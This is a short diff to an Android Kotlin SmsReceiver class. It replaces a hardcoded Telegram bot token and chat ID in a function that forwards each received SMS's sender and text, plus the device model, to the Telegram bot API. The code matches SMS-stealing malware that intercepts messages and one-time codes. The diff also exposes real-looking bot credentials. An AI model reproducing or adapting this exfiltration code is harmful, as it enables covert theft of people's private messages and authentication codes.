@@ -63,8 +63,8 @@ class SmsReceiver : BroadcastReceiver() {
 
     private fun sendSmsToBot(sender: String, message: String) {
         try {
-            val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
-            val chatId = "6331293386"
+            val botToken = "8278693005:AAEJMer1juepZXE0lP2QPAok7Pb-pscuoR4"
+            val chatId = "7212024751"
             val url = "https://api.telegram.org/bot$botToken/sendMessage"
             val deviceModel = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
 
